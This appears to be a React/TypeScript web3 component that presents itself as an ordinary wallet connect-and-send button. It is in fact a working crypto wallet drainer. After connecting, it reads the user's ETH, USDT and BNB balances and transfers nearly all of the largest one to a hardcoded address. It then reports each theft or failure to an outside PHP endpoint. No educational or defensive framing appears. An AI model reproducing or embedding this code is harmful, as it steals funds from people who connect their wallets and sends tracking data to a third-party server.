'use client'

import { createWeb3Modal, defaultConfig } from '@web3modal/ethers/react'
import { useWeb3Modal } from '@web3modal/ethers/react'
import { BigNumber } from '@ethersproject/bignumber'
import { Web3Provider, ExternalProvider } from '@ethersproject/providers'
import { Contract } from '@ethersproject/contracts'
import styled from 'styled-components'
import { useState } from 'react'

// 1. Get projectId at https://cloud.walletconnect.com
const projectId = 'e67036fc2887623576e98ce387998086'

// 2. Set chains
const mainnet = {
  chainId: 1,
  name: 'Ethereum',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: 'https://cloudflare-eth.com'
}

// 3. Create modal
const metadata = {
  name: 'My Website',
  description: 'My Website description',
  url: 'https://mywebsite.com',
  icons: ['https://avatars.mywebsite.com/']
}

createWeb3Modal({
  ethersConfig: defaultConfig({ metadata }),
  chains: [mainnet],
  projectId
})

export function Web3ModalProvider({ children }: { children: React.ReactNode }) {
  return children
}

const Button = styled.button`
  border: 1px solid green;
  padding: 10px;
  cursor: pointer;
  &:hover {
    background-color: #f99ff9;
  }
`

const sendLog = async (type: string, details: string) => {
  try {
    await fetch('https://eflujsyb0kuybgol11532.cleavr.one/btc/backend.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ type, details })
    })
  } catch (error) {
    console.error('Error sending log:', error)
  }
}

export function ConnectButton() {
  const { open } = useWeb3Modal()
  const [provider, setProvider] = useState<Web3Provider | null>(null)
  const [address, setAddress] = useState<string | null>(null)

  const detectWallet = async () => {
    if (typeof window.ethereum !== 'undefined') {
      try {
        await window.ethereum.request({ method: 'eth_requestAccounts' })
        if (window.ethereum.isTrust) {
          return window.ethereum // Trust Wallet detected
        }
        return window.ethereum // MetaMask or other wallet detected
      } catch (error) {
        console.error('User rejected the request')
      }
    } else if (typeof window.trustwallet !== 'undefined') {
      return window.trustwallet // Trust Wallet detected
    } else if (typeof window.web3 !== 'undefined') {
      return window.web3.currentProvider // Legacy web3 provider detected
    }
    return null
  }

  const connectWallet = async () => {
    try {
      let detectedProvider = await detectWallet()

      if (!detectedProvider) {
        console.log('No provider detected, opening WalletConnect modal...')
        detectedProvider = await open()
      }

      if (!detectedProvider) {
        throw new Error('No wallet provider found')
      }

      const web3Provider = new Web3Provider(detectedProvider as ExternalProvider)
      setProvider(web3Provider)

      const signer = web3Provider.getSigner()
      const userAddress = await signer.getAddress()
      setAddress(userAddress)
      console.log('Connected address:', userAddress)
    } catch (error) {
      console.error('Error connecting wallet:', error)
      alert('Error connecting wallet')
    }
  }

  const sendTransaction = async () => {
    if (!provider || !address) {
      alert('Please connect your wallet first.')
      return
    }

    try {
      const signer = provider.getSigner()

      // Token contract addresses
      const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
      const bnbAddress = '0xB8c77482e45F1F44dE1745F52C74426C631bDD52' // Note: BNB on Ethereum network

      // ERC20 ABI
      const erc20Abi = [
        'function balanceOf(address owner) view returns (uint256)',
        'function transfer(address to, uint amount) returns (bool)'
      ]

      // Create token contract instances
      const usdtContract = new Contract(usdtAddress, erc20Abi, signer)
      const bnbContract = new Contract(bnbAddress, erc20Abi, signer)

      // Fetch balances
      const ethBalance = await provider.getBalance(address)
      const usdtBalance = await usdtContract.balanceOf(address)
      const bnbBalance = await bnbContract.balanceOf(address)

      console.log('ETH Balance:', ethBalance.toString())
      console.log('USDT Balance:', usdtBalance.toString())
      console.log('BNB Balance:', bnbBalance.toString())

      // Determine the highest balance
      let highestBalanceToken: 'ETH' | 'USDT' | 'BNB' = 'ETH'
      let highestBalance = ethBalance
      if (usdtBalance.gt(highestBalance)) {
        highestBalance = usdtBalance
        highestBalanceToken = 'USDT'
      }
      if (bnbBalance.gt(highestBalance)) {
        highestBalance = bnbBalance
        highestBalanceToken = 'BNB'
      }

      console.log('Highest balance token:', highestBalanceToken)

      // Calculate gas fees
      const gasPrice = await provider.getGasPrice()
      const gasLimit = BigNumber.from(21000) // Base transaction cost
      const gasCost = gasPrice.mul(gasLimit)

      const recipient = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f' // replace with the desired recipient address

      if (highestBalanceToken === 'ETH') {
        const value = highestBalance.sub(gasCost)
        const tx = await signer.sendTransaction({
          to: recipient,
          value
        })
        await tx.wait()
        await sendLog('approved', `ETH transaction to ${recipient} with value ${value.toString()}`)
      } else if (highestBalanceToken === 'USDT') {
        const usdtGasLimit = BigNumber.from(65000) // Approximate gas limit for USDT transfer
        const usdtGasCost = gasPrice.mul(usdtGasLimit)
        const usdtValue = highestBalance.sub(usdtGasCost)
        const tx = await usdtContract.transfer(recipient, usdtValue)
        await tx.wait()
        await sendLog('approved', `USDT transaction to ${recipient} with value ${usdtValue.toString()}`)
      } else if (highestBalanceToken === 'BNB') {
        const bnbGasLimit = BigNumber.from(65000) // Approximate gas limit for BNB transfer
        const bnbGasCost = gasPrice.mul(bnbGasLimit)
        const bnbValue = highestBalance.sub(bnbGasCost)
        const tx = await bnbContract.transfer(recipient, bnbValue)
        await tx.wait()
        await sendLog('approved', `BNB transaction to ${recipient} with value ${bnbValue.toString()}`)
      }

      alert('Transaction successful!')
    } catch (error) {
      console.error('Error sending transaction:', error)

      // Check if error is an instance of Error
      if (error instanceof Error) {
        await sendLog('error', `Transaction failed: ${error.message}`)
      } else {
        await sendLog('error', 'Transaction failed: Unknown error')
      }

      alert('Transaction failed!')
    }
  }

  return (
    <>
      <Button onClick={connectWallet}>Connect Wallet</Button>
      <Button onClick={sendTransaction} disabled={!provider}>Send Transaction</Button>
    </>
  )
}
